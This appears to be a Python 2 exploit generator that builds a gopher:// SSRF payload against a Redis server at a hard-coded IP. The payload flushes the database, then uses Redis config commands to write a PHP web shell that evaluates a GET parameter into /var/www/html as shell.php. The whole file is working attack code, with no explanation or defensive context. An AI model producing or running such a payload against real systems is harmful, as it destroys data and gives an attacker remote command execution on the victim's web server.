import urllib

protocol = "gopher://"
ip = "173.216.189.11"
port = "6379"
shell = "\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename = "shell.php"
path = "/var/www/html"
passwd = ""
cmd = ["flushall",
       "set 1 {}".format(shell.replace(" ", "${IFS}")),
       "config set dir {}".format(path),
       "config set dbfilename {}".format(filename),
       "save"
       ]
if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))
payload = protocol + ip + ":" + port + "/_"


def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
    cmd += CRLF
    return cmd


if __name__ == "__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print(payload)
